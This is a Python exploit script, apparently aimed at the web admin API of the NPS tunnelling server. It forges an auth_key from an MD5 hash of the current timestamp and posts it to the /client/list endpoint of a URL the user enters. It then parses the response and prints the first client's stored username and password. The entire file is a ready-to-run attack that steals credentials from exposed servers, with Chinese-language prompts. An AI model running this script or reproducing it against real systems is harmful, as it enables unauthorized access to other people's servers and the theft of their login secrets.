#encoding=utf-8
# author axing
# date 2022/10/8
import time
import hashlib
from wsgiref import headers
import requests
import json
def nps_exp(urls):
    now = time.time()
    m = hashlib.md5()
    m.update(str(int(now)).encode("utf8"))
    auth_key = m.hexdigest()
    # proxy={
    #     'http': 'http://127.0.0.1:8089',
    #     'https': 'https://127.0.0.1:8089'
    # }
    urlf=urls[7:]
    print (urlf)
    if urls[-1].isdigit():
        print("输入的是正确url地址")
    else:
        urlf=urls[7:-1]
        urls=urls[:-1]
        print(urlf)
    header={
        "host": '{}'.format(urlf),
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
        "Accept-Language": 'zh-CN,zh;q=0.9',
        'Origin': '{}'.format(urls),
        'Connection': 'close',
        'Referer': '{}'.format(urls)

    }
    data = {
        'search': '',
        'order': 'asc',
        'offset': '0',
        'limit': '10',
        'auth_key': '{}'.format(auth_key),
        'timestamp': '{}'.format(int(now)),
    }

    url=urls+'/client/list'
    print(url)
    try:
        req=requests.post(url=url,headers=header,data=data,timeout=2,verify=False)
        txt='bridgePort'
        tx=req.text
        if txt in tx:
            tx=json.loads(tx)
            print(tx)
            print("url:"+urls+'\n'+"账号："+tx["rows"][0]["Cnf"]["U"]+'\n'+"密码"+tx["rows"][0]["Cnf"]["P"]+'\n')
                
    except requests.ConnectionError:
        print("连接错误")
    except requests.ConnectTimeout:
        print("连接超时")
    
if __name__=='__main__':
    url=input("请输入url:")
    nps_exp(url)